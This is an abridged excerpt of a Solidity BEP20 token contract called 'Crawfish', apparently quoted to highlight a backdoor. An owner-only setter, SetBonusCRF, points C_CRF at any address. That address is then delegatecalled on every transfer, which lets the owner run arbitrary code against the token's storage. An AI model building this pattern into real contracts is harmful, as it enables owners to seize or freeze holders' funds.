...
contract Crawfish is Context, iBEP20, Ownable{
  ...
  */
  ...
  function claimDividendCRF(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_CRF.delegatecall(
  ...
  function SetBonusCRF(address c) public onlyOwner {
    C_CRF = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendCRF(sender, recipient, amount);   
